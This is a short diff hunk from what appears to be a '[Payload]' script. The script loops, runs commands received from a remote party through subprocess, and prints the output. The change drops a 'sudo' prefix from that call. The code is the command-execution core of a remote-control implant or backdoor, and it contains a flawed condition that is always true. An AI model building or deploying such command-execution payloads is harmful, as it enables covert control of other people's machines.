@@ -51,7 +51,7 @@ while True:
         else:
 			# Run the command received, and print the output to the 'buffer' variable
             print("[Payload] Running command : "+prev_packet)
-            temp = subprocess.getoutput("sudo "+prev_packet)
+            temp = subprocess.getoutput(prev_packet)
         
         if not (prev_packet == "ls" or "whoami"):
             time.sleep(3.0)
